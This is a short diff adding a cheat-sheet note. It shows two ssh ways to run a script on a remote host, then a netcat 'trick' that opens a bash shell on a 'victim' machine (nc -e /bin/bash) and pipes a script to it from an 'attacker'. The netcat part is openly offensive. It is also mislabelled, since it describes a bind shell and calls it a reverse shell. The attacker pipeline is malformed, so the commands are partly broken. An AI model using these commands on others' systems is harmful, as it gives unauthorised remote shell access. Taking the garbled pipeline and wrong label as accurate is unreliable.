@@ -1,0 +1,10 @@
+Run a script remotely using ssh + pipe:
++) method 1:
+ssh user@host 'bash -s' < /path/script.sh
++) method 2:
+cat /path/script.sh | ssh user@host 'bash -s'
+
+My trick: Running script remotely via netcat (revesre shell)
+
+Victim: nc -nvlp <port> -e /bin/bash
+Attacker: bash -s | cat /path/script.sh | nc -nv <ip> <port>
